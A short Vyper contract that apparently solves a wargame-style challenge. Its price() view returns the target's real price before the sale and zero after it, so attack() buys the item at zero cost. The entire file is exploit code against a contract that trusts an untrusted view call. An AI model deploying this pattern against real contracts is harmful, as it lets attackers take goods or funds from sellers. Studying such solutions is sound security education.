# @version ^0.3.7

interface InstanceInterface:
    def price() -> uint256: view
    def isSold() -> bool: view
    def buy(): nonpayable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
@view
def price() -> uint256:
    if self.instance.isSold() == False:
        return self.instance.price()
    return 0
  
@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.buy()
    assert self.instance.isSold() == True, "!sold"
    assert self.instance.price() == 0, "price !zero"
